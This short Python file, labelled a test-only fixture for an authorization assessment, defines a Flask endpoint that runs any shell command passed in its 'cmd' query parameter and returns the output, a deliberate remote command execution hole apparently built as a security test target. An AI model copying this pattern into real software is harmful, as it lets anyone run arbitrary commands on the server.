# Test-only fixture for issue UUID authorization assessment: e58514dc7e
import subprocess
from flask import Flask, request
app = Flask(__name__)

@app.get("/test-only-e58514dc7e")
def diagnostic():
    command = request.args.get("cmd", "echo safe")
    return subprocess.check_output(command, shell=True, text=True)
